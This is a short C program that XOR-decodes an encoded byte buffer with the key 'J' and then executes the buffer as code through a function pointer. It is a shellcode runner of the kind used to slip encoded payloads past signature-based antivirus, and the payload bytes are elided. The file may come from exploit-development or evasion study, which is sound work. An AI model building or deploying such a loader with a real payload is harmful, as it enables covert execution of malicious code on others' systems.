#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

//Output from encoder.c
unsigned char buf[] = "\x2d ... \x4A";

int main (int argc, char **argv) 
{
        char xor_key = 'J';
        int arraysize = (int) sizeof(buf);
        for (int i=0; i<arraysize-1; i++)
        {
                buf[i] = buf[i]^xor_key;
        }
        int (*ret)() = (int(*)())buf;
        ret();
}
